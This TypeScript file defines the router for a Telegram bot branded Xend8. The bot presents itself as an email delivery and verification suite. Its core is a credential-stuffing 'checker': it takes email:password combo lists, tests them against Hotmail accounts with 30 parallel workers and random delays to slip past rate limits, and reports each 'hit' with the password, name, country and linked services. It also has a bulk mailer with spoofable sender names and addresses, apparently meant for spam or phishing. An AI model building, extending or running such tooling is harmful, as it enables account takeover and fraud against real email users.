import { z } from "zod";
import { createRouter, publicQuery } from "../middleware";
import { getDb } from "../queries/connection";
import { botSessions } from "@db/schema";
import { eq } from "drizzle-orm";
import {
  isValidUser,
  deleteMessage,
  editMessage,
  sendMessage,
  sendDocument,
  answerCallbackQuery,
  getMainMenuKeyboard,
  getSettingsKeyboard,
  getRecipientsChoiceKeyboard,
  getBodyChoiceKeyboard,
  getConfirmSendKeyboard,
  getBackKeyboard,
  getSkipAttachmentsKeyboard,
  getCheckerStartKeyboard,
  getCheckerStopKeyboard,
  getProgressBar,
  getLoadingAnimation,
} from "../services/telegram";
import { sendEmail } from "../services/email";
// In-memory session store for email flow and checker flow
interface BotSessionData {
  emailFlow?: {
    step: string;
    recipientsChoice?: string;
    recipients: string[];
    senderName?: string;
    subject?: string;
    body?: string;
    bodyChoice?: string;
    senderEmail?: string;
  };
  checkerFlow?: {
    step: string;
    combos: { email: string; password: string }[];
    active: boolean;
    results: any[];
    messageId?: number;
  };
  settingsFlow?: {
    step: string;
    smtpInput?: any;
  };
  smtpConfig?: {
    host: string;
    port: number;
    username: string;
    password: string;
    secure: boolean;
  };
  lastBotMessageIds: number[];
}

const sessions = new Map<string, BotSessionData>();

function getSession(userId: string): BotSessionData {
  if (!sessions.has(userId)) {
    sessions.set(userId, { lastBotMessageIds: [] });
  }
  return sessions.get(userId)!;
}

async function trackMessage(userId: string, result: any) {
  if (result?.ok && result?.result?.message_id) {
    const session = getSession(userId);
    session.lastBotMessageIds.push(result.result.message_id);
  }
}

async function clearMessages(chatId: number, userId: string) {
  const session = getSession(userId);
  for (const msgId of session.lastBotMessageIds) {
    await deleteMessage(chatId, msgId);
  }
  session.lastBotMessageIds = [];
}

async function updateSessionInDb(userId: string, firstName: string, isValid: boolean) {
  const db = getDb();
  const existing = await db.select().from(botSessions).where(eq(botSessions.userId, userId));

  const sessionData = getSession(userId);

  if (existing.length > 0) {
    await db
      .update(botSessions)
      .set({
        firstName,
        isValid,
        sessionData: sessionData as any,
        updatedAt: new Date(),
      })
      .where(eq(botSessions.userId, userId));
  } else {
    await db.insert(botSessions).values({
      userId,
      firstName,
      isValid,
      sessionData: sessionData as any,
    });
  }
}

export const botRouter = createRouter({
  webhook: publicQuery
    .input(z.any())
    .mutation(async ({ input }) => {
      const body = input;

      if (body.message) {
        const chatId = body.message.chat.id;
        const userId = body.message.from.id.toString();
        const firstName = body.message.from.first_name || "User";
        const text = body.message.text || "";
        const messageId = body.message.message_id;

        // Delete user message
        await deleteMessage(chatId, messageId);

        const valid = isValidUser(userId);
        const session = getSession(userId);

        // Store/update user in DB
        await updateSessionInDb(userId, firstName, valid);

        if (!valid && text !== "/start") {
          return { ok: true };
        }

        // Handle email flow text inputs
        if (session.emailFlow) {
          const { step } = session.emailFlow;

          if (step === "recipients") {
            const emails = text
              .split("\n")
              .map((e: string) => e.trim())
              .filter((e: string) => e.includes("@") && e.includes("."));

            if (emails.length === 0) {
              const result = await sendMessage(
                chatId,
                "✗ Invalid email address(es). Please try again:",
                getBackKeyboard()
              );
              await trackMessage(userId, result);
              return { ok: true };
            }

            session.emailFlow.recipients = emails;
            session.emailFlow.step = "sender_name";

            const result = await sendMessage(
              chatId,
              `✓ Recipients saved: ${emails.length}\n\n<b>Step 2:</b> Send me the sender name:`,
              getBackKeyboard()
            );
            await trackMessage(userId, result);
            return { ok: true };
          }

          if (step === "sender_name") {
            session.emailFlow.senderName = text;
            session.emailFlow.step = "subject";

            const result = await sendMessage(
              chatId,
              `✓ Sender name: ${text}\n\n<b>Step 3:</b> Send me the email subject:`,
              getBackKeyboard()
            );
            await trackMessage(userId, result);
            return { ok: true };
          }

          if (step === "subject") {
            session.emailFlow.subject = text;
            session.emailFlow.step = "sender_email";

            const result = await sendMessage(
              chatId,
              `✓ Subject: ${text}\n\n<b>Step 4:</b> Send me the sender email address (or type "skip" to use default):`,
              getBackKeyboard()
            );
            await trackMessage(userId, result);
            return { ok: true };
          }

          if (step === "sender_email") {
            session.emailFlow.senderEmail = text.toLowerCase() === "skip" ? undefined : text;
            session.emailFlow.step = "body_choice";

            const result = await sendMessage(
              chatId,
              `<b>Step 5:</b> How would you like to send the message content?`,
              getBodyChoiceKeyboard()
            );
            await trackMessage(userId, result);
            return { ok: true };
          }

          if (step === "body") {
            session.emailFlow.body = text;
            session.emailFlow.step = "attachments";

            const result = await sendMessage(
              chatId,
              `<b>Step 6:</b> Send attachments (optional) or skip:`,
              getSkipAttachmentsKeyboard()
            );
            await trackMessage(userId, result);
            return { ok: true };
          }
        }

        // Handle settings SMTP config input
        if (session.settingsFlow?.step === "smtp_input") {
          const lines = text.split("\n").map((l: string) => l.trim());

          if (lines.length < 5) {
            const result = await sendMessage(
              chatId,
              "✗ Invalid format. Please provide all 5 lines: host, port, username, password, secure",
              getBackKeyboard("back_settings")
            );
            await trackMessage(userId, result);
            return { ok: true };
          }

          try {
            const portNum = parseInt(lines[1]);
            if (isNaN(portNum)) throw new Error("Invalid port");

            // Store temporarily, show Save confirmation
            session.settingsFlow = {
              step: "smtp_confirm",
              smtpInput: {
                host: lines[0],
                port: portNum,
                username: lines[2],
                password: lines[3],
                secure: lines[4].toLowerCase() === "true",
              },
            };

            const confirmKeyboard = {
              inline_keyboard: [
                [{ text: "⎘ Save", callback_data: "smtp_save_confirm" }],
                [{ text: "☚ Back", callback_data: "back_settings" }],
              ],
            };

            await clearMessages(chatId, userId);
            const result = await sendMessage(
              chatId,
              `<b>⏣ SMTP Config</b>\n\nReview your settings:\nHost: ${lines[0]}\nPort: ${portNum}\nUsername: ${lines[2].substring(0, 2)}***${lines[2].substring(lines[2].length - 2)}\nSecure: ${lines[4].toLowerCase() === "true"}\n\nSave these settings?`,
              confirmKeyboard
            );
            await trackMessage(userId, result);
          } catch {
            const result = await sendMessage(
              chatId,
              "✗ Invalid configuration. Please try again.",
              getBackKeyboard("back_settings")
            );
            await trackMessage(userId, result);
          }
          return { ok: true };
        }

        // Handle checker combo input
        if (session.checkerFlow?.step === "input") {
          const lines = text.split("\n").map((l: string) => l.trim()).filter((l: string) => l.includes(":"));
          const combos = lines.map((line: string) => {
            const [email, password] = line.split(":", 2);
            return { email: email.trim(), password: password.trim() };
          });

          if (combos.length === 0) {
            const result = await sendMessage(
              chatId,
              "✗ No valid combos found. Format: email:password",
              getBackKeyboard()
            );
            await trackMessage(userId, result);
            return { ok: true };
          }

          session.checkerFlow.combos = combos;
          session.checkerFlow.step = "ready";

          const result = await sendMessage(
            chatId,
            `✓ Loaded ${combos.length} combos\n\nReady to start checking?`,
            getCheckerStartKeyboard()
          );
          await trackMessage(userId, result);
          return { ok: true };
        }

        // Handle commands
        if (text === "/start") {
          await handleStart(chatId, userId, firstName);
        } else if (text && !text.startsWith("/")) {
          const result = await sendMessage(
            chatId,
            "Please use the menu buttons below.",
            getMainMenuKeyboard(valid)
          );
          await trackMessage(userId, result);
        }

        return { ok: true };
      }

      // Handle callback queries
      if (body.callback_query) {
        const chatId = body.callback_query.message.chat.id;
        const userId = body.callback_query.from.id.toString();
        const data = body.callback_query.data;

        await answerCallbackQuery(body.callback_query.id);

        const valid = isValidUser(userId);
        if (!valid) return { ok: true };

        const session = getSession(userId);

        // Email flow callbacks
        if (data === "send_emails") {
          await handleSendEmails(chatId, userId);
        } else if (data === "recipients_single" || data === "recipients_multiple" || data === "recipients_file") {
          session.emailFlow = {
            step: "recipients",
            recipientsChoice: data.replace("recipients_", ""),
            recipients: [],
          };

          const msgText =
            data === "recipients_single"
              ? "Send me the recipient email address:"
              : data === "recipients_multiple"
              ? "Send me the email addresses (one per line):"
              : "Upload a .txt file with email addresses (one per line):";

          await clearMessages(chatId, userId);
          const result = await sendMessage(chatId, msgText, getBackKeyboard());
          await trackMessage(userId, result);
        } else if (data === "body_text" || data === "body_html" || data === "body_file") {
          if (session.emailFlow) {
            session.emailFlow.bodyChoice = data.replace("body_", "");
            session.emailFlow.step = "body";

            const msgText =
              data === "body_text"
                ? "Send me the email body (plain text):"
                : data === "body_html"
                ? "Paste your HTML code:"
                : "Upload a .html file:";

            await clearMessages(chatId, userId);
            const result = await sendMessage(chatId, msgText, getBackKeyboard());
            await trackMessage(userId, result);
          }
        } else if (data === "skip_attachments") {
          if (session.emailFlow) {
            session.emailFlow.step = "confirm";
            await showConfirmation(chatId, userId);
          }
        } else if (data === "confirm_send") {
          await handleConfirmSend(chatId, userId);
        } else if (data === "back_email_flow") {
          session.emailFlow = undefined;
          await handleSendEmails(chatId, userId);
        }
        // Checker flow
        else if (data === "checker") {
          await handleChecker(chatId, userId);
        } else if (data === "checker_start") {
          await handleCheckerStart(chatId, userId);
        } else if (data === "checker_stop") {
          if (session.checkerFlow) {
            session.checkerFlow.active = false;
          }
        }
        // Settings callbacks
        else if (data === "settings") {
          await handleSettings(chatId, userId);
        } else if (data === "smtp_config") {
          await handleSMTPConfig(chatId, userId);
        } else if (data === "smtp_info") {
          await handleSMTPInfo(chatId, userId);
        } else if (data === "delete_smtp") {
          const s = getSession(userId);
          s.smtpConfig = undefined;
          await updateSessionInDb(userId, "", true);
          await handleSettings(chatId, userId);
        } else if (data === "smtp_save_confirm") {
          // Save SMTP config
          if (session.settingsFlow?.smtpInput) {
            const cfg = session.settingsFlow.smtpInput;
            session.smtpConfig = cfg;
            session.settingsFlow = undefined;
            const cbqFirstName = body.callback_query.from.first_name || "";
            await updateSessionInDb(userId, cbqFirstName, valid);

            await clearMessages(chatId, userId);
            const result = await sendMessage(
              chatId,
              `Saved ☑\n\nSMTP configuration saved successfully.`,
              getMainMenuKeyboard(true)
            );
            await trackMessage(userId, result);
          }
        } else if (data === "back_settings") {
          await handleSettings(chatId, userId);
        } else if (data === "back_to_menu") {
          await handleBackToMenu(chatId, userId);
        }

        return { ok: true };
      }

      return { ok: true };
    }),
});

// Handler functions
async function handleStart(chatId: number, userId: string, firstName: string) {
  await clearMessages(chatId, userId);

  const valid = isValidUser(userId);
  const session = getSession(userId);
  session.lastBotMessageIds = [];

  // Show initializing animation
  const initMsg = await sendMessage(chatId, `Initializing...\n${getLoadingAnimation(50)}`);
  if (initMsg?.ok) {
    const msgId = initMsg.result.message_id;
    await trackMessage(userId, initMsg);

    await new Promise((r) => setTimeout(r, 300));
    await editMessage(chatId, msgId, `Checking User...\n${getLoadingAnimation(80)}`);
    await new Promise((r) => setTimeout(r, 300));

    if (valid) {
      await editMessage(chatId, msgId, `Welcome ${firstName} ⍥`);
    } else {
      await editMessage(chatId, msgId, `Invalid User ${firstName} ⍢`);
    }

    await new Promise((r) => setTimeout(r, 1000));
    await deleteMessage(chatId, msgId);
  }

  if (valid) {
    const result = await sendMessage(
      chatId,
      `<b>Welcome to ✗ᴇɴᴅ8!</b> ⍥\n\nYour email delivery & verification suite.\n\nWhat would you like to do?`,
      getMainMenuKeyboard(true)
    );
    await trackMessage(userId, result);
  } else {
    const result = await sendMessage(
      chatId,
      `<b>Access Denied</b> ⍢\n\nYou don't have access to this bot.`,
      { inline_keyboard: [] }
    );
    await trackMessage(userId, result);
  }
}

async function handleSendEmails(chatId: number, userId: string) {
  await clearMessages(chatId, userId);

  const session = getSession(userId);
  session.emailFlow = {
    step: "recipients_choice",
    recipients: [],
  };

  const result = await sendMessage(
    chatId,
    `<b>@ ᴍᴀɪʟᴇʀ</b>\n\nHow would you like to add recipients?`,
    getRecipientsChoiceKeyboard()
  );
  await trackMessage(userId, result);
}

async function handleChecker(chatId: number, userId: string) {
  await clearMessages(chatId, userId);

  const session = getSession(userId);
  session.checkerFlow = {
    step: "input",
    combos: [],
    active: false,
    results: [],
  };

  const result = await sendMessage(
    chatId,
    `<b>♞ ᴄʜᴇᴄᴋᴇʀ</b>\n\nSend me your combo list (email:password, one per line) or upload a .txt file:`,
    getBackKeyboard()
  );
  await trackMessage(userId, result);
}

async function handleCheckerStart(chatId: number, userId: string) {
  const session = getSession(userId);
  if (!session.checkerFlow || session.checkerFlow.combos.length === 0) return;

  session.checkerFlow.active = true;
  session.checkerFlow.step = "running";
  session.checkerFlow.results = [];

  const combos = session.checkerFlow.combos;

  await clearMessages(chatId, userId);

  // Use the parallel checker engine
  const db = getDb();
  const { checkerResults } = await import("@db/schema");

  // Deduplicate combos
  const seen = new Set<string>();
  const uniqueCombos = combos.filter((c: any) => {
    const id = `${c.email}:${c.password}`;
    if (seen.has(id)) return false;
    seen.add(id);
    return true;
  });

  const total = uniqueCombos.length;

  // Show progress message
  const progressMsg = await sendMessage(
    chatId,
    `Checking...\n${getProgressBar(0, total)}\n✓ 0 | ✗ 0 / ${total}`,
    getCheckerStopKeyboard()
  );

  if (progressMsg?.ok) {
    session.checkerFlow.messageId = progressMsg.result.message_id;
    await trackMessage(userId, progressMsg);
  }

  // ── Parallel Worker Engine ──
  const MAX_WORKERS = 30;
  const checkedAccounts = new Set<string>();
  let processed = 0;
  let hits = 0;
  let bads = 0;
  let retries = 0;
  let hitBuffer = "";

  async function checkWorker(combo: any, _retryCount = 0): Promise<void> {
    if (!session.checkerFlow?.active) return;

    const accountId = `${combo.email}:${combo.password}`;
    if (checkedAccounts.has(accountId)) {
      processed++;
      return;
    }
    checkedAccounts.add(accountId);

    // Random delay (rate limiting)
    await new Promise((r) => setTimeout(r, Math.random() * 40 + 10));
    if (!session.checkerFlow?.active) return;

    try {
      const { checkAccount } = await import("../services/checker");
      const result = await checkAccount(combo.email, combo.password);

      // Save to DB
      await db.insert(checkerResults).values({
        email: result.email,
        password: result.password,
        status: result.status,
        name: result.name,
        country: result.country,
        linkedServices: result.linkedServices?.join(", ") || "",
      });

      if (result.status === "HIT") {
        hits++;
        const services = result.linkedServices?.join("\n") || "No linked apps found";

        await sendMessage(
          chatId,
          `ᜰ ✗ᴇɴᴅ8 HOTMAIL HIT FOUND ᜰ\n⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊\n📧 Email: ${result.email}\n🔑 Pass: ${result.password}\n👤 Name: ${result.name || "Unknown"}\n🌍 Country: ${result.country || "Unknown"}\n⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊\n🔗 Linked Services:\n${services}\n\n✗ Total Hits: ${hits}\n⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊`
        );

        // Build hit buffer for file
        const linkedStr = result.linkedServices?.join(", ") || "None";
        hitBuffer += `${result.email}:${result.password} | ${result.name || "Unknown"} | ${result.country || "Unknown"} | [${linkedStr}]\n`;
      } else if (result.status === "BAD") {
        bads++;
      } else if (result.status === "RETRY") {
        retries++;
      }

      processed++;

      // Update progress
      if (session.checkerFlow?.messageId) {
        await editMessage(
          chatId,
          session.checkerFlow.messageId,
          `Checking...\n${getProgressBar(processed, total)}\n✓ ${hits} | ✗ ${bads} / ${total}`,
          getCheckerStopKeyboard()
        );
      }
    } catch {
      processed++;
    }
  }

  // Process in batches of MAX_WORKERS
  for (let i = 0; i < uniqueCombos.length; i += MAX_WORKERS) {
    if (!session.checkerFlow?.active) break;
    const batch = uniqueCombos.slice(i, i + MAX_WORKERS);
    await Promise.all(batch.map((c: any) => checkWorker(c)));
  }

  // Upload hits file
  if (hits > 0 && hitBuffer) {
    try {
      const encoder = new TextEncoder();
      const hitData = encoder.encode(hitBuffer);
      await sendDocument(
        chatId,
        hitData,
        `ᜰ ALL HITS - Total: ${hits}\n@x08dev @Xend8tool`,
        "xend8_hits.txt"
      );
    } catch {
      // silently fail
    }
  }

  session.checkerFlow.active = false;

  // Final message
  if (session.checkerFlow.messageId) {
    await deleteMessage(chatId, session.checkerFlow.messageId);
  }

  const stoppedText = session.checkerFlow?.active === false && processed < total ? "Stopped ⊘" : "Completed ☑";
  const result = await sendMessage(
    chatId,
    `${stoppedText}\n✓ Valid: ${hits}\n✗ Invalid: ${bads}\n⧖ Retries: ${retries}\nTotal: ${processed}/${total}`,
    getMainMenuKeyboard(true)
  );
  await trackMessage(userId, result);
}

async function handleSettings(chatId: number, userId: string) {
  await clearMessages(chatId, userId);

  const session = getSession(userId);
  session.settingsFlow = { step: "main" };

  const result = await sendMessage(
    chatId,
    `<b>⚙ ꜱᴇᴛᴛɪɴɢꜱ</b>\n\nManage your configuration:`,
    getSettingsKeyboard()
  );
  await trackMessage(userId, result);
}

async function handleSMTPConfig(chatId: number, userId: string) {
  await clearMessages(chatId, userId);

  const session = getSession(userId);
  session.settingsFlow = { step: "smtp_input" };

  const result = await sendMessage(
    chatId,
    `<b>⏣ SMTP Config</b>\n\nSend your SMTP details (5 lines):\n\nhost\nport\nusername\npassword\nsecure (true/false)\n\n<b>Example:</b>\nsmtp.gmail.com\n587\nyour-email@gmail.com\nyour-password\nfalse`,
    getBackKeyboard("back_settings")
  );
  await trackMessage(userId, result);
}

async function handleSMTPInfo(chatId: number, userId: string) {
  await clearMessages(chatId, userId);

  const session = getSession(userId);
  const smtpConfig = session.smtpConfig;

  if (!smtpConfig) {
    const result = await sendMessage(
      chatId,
      `<b>ⓘ SMTP Info</b>\n\nNo SMTP configuration saved.\n\nGo to SMTP Config to set it up.`,
      getBackKeyboard("back_settings")
    );
    await trackMessage(userId, result);
    return;
  }

  const result = await sendMessage(
    chatId,
    `<b>ⓘ SMTP Info</b>\n\nHost: ${smtpConfig.host}\nPort: ${smtpConfig.port}\nSecure: ${smtpConfig.secure}\nUsername: masked\nPassword: masked`,
    {
      inline_keyboard: [
        [{ text: "⌫ Delete", callback_data: "delete_smtp" }],
        [{ text: "☚ Back", callback_data: "back_settings" }],
      ],
    }
  );
  await trackMessage(userId, result);
}

async function showConfirmation(chatId: number, userId: string) {
  const session = getSession(userId);
  if (!session.emailFlow) return;

  const { recipients, senderName, subject, body, senderEmail } = session.emailFlow;
  const bodyPreview = body ? body.substring(0, 100) + (body.length > 100 ? "..." : "") : "";

  await clearMessages(chatId, userId);

  const result = await sendMessage(
    chatId,
    `<b>Review & Send</b>\n\nRecipients: ${recipients.length}\nSender: ${senderName || "✗ᴇɴᴅ8"}\nFrom: ${senderEmail || "SMTP default"}\nSubject: ${subject}\nBody: ${bodyPreview}\n\nReady to send?`,
    getConfirmSendKeyboard()
  );
  await trackMessage(userId, result);
}

async function handleConfirmSend(chatId: number, userId: string) {
  const session = getSession(userId);
  if (!session.emailFlow) return;

  const { recipients, senderName, subject, body, senderEmail } = session.emailFlow;

  if (!recipients || recipients.length === 0 || !body) {
    const result = await sendMessage(
      chatId,
      "✗ Missing information. Please start over.",
      getMainMenuKeyboard(true)
    );
    await trackMessage(userId, result);
    return;
  }

  await clearMessages(chatId, userId);

  // Show starting animation
  const startMsg = await sendMessage(chatId, `Starting...\n${getLoadingAnimation(80)}`);
  let msgId = startMsg?.result?.message_id;

  if (msgId) {
    await trackMessage(userId, startMsg);
    await new Promise((r) => setTimeout(r, 400));

    // Get SMTP config
    const db = getDb();
    const configs = await db.select().from(
      (await import("@db/schema")).smtpConfigs
    );

    let smtpConfig = configs[0];

    // Fallback to session config
    if (!smtpConfig && session.smtpConfig) {
      const sConfig = session.smtpConfig;
      smtpConfig = sConfig as any;
    }

    if (!smtpConfig) {
      await editMessage(chatId, msgId, "✗ No SMTP configuration found. Please set up SMTP in Settings.");
      const result = await sendMessage(chatId, "✗ No SMTP config", getMainMenuKeyboard(true));
      await trackMessage(userId, result);
      session.emailFlow = undefined;
      return;
    }

    await editMessage(chatId, msgId, `Sending messages...\n${getProgressBar(0, recipients.length)}`);

    let successCount = 0;
    let failureCount = 0;

    for (let i = 0; i < recipients.length; i++) {
      const recipient = recipients[i];

      try {
        const result = await sendEmail(
          {
            host: smtpConfig.host,
            port: smtpConfig.port,
            username: smtpConfig.username,
            password: smtpConfig.password,
            secure: smtpConfig.secure,
          },
          recipient,
          subject || "Message from ✗ᴇɴᴅ8",
          body,
          senderName || "✗ᴇɴᴅ8",
          senderEmail
        );

        if (result.success) {
          successCount++;
        } else {
          failureCount++;
        }
      } catch {
        failureCount++;
      }

      await editMessage(
        chatId,
        msgId,
        `Sending messages...\n${getProgressBar(successCount + failureCount, recipients.length)}`
      );

      await new Promise((r) => setTimeout(r, 100));
    }

    session.emailFlow = undefined;

    await editMessage(
      chatId,
      msgId,
      `Completed ☑\n✓ Success: ${successCount}\n✗ Failed: ${failureCount}`
    );

    await new Promise((r) => setTimeout(r, 1500));
    await deleteMessage(chatId, msgId);

    const result = await sendMessage(
      chatId,
      `<b>Completed ☑</b>\n\n✓ Success: ${successCount}\n✗ Failed: ${failureCount}`,
      getMainMenuKeyboard(true)
    );
    await trackMessage(userId, result);
  }
}

async function handleBackToMenu(chatId: number, userId: string) {
  await clearMessages(chatId, userId);

  const session = getSession(userId);
  session.emailFlow = undefined;
  session.checkerFlow = undefined;
  session.settingsFlow = undefined;

  const result = await sendMessage(
    chatId,
    `<b>✗ᴇɴᴅ8</b> ⍥\n\nYour email delivery & verification suite.\n\nWhat would you like to do?`,
    getMainMenuKeyboard(true)
  );
  await trackMessage(userId, result);
}
